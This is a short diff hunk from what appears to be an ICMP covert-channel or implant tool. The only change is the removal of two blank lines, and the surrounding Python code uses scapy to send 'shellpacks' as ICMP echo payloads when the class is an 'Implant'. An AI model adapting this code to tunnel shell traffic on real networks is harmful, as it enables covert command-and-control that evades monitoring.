@@ -177,8 +177,6 @@ class Host:
         if type(self).__name__ == 'Implant':
             icmp_type = 8
         
-
-
         for shellpack in shellpacks:
             data = (IP(dst=ip, ttl=TTL)/ICMP(type=icmp_type, id=ICMP_ID)/Raw(load=shellpack))
             sr(data, timeout=0, verbose=0)
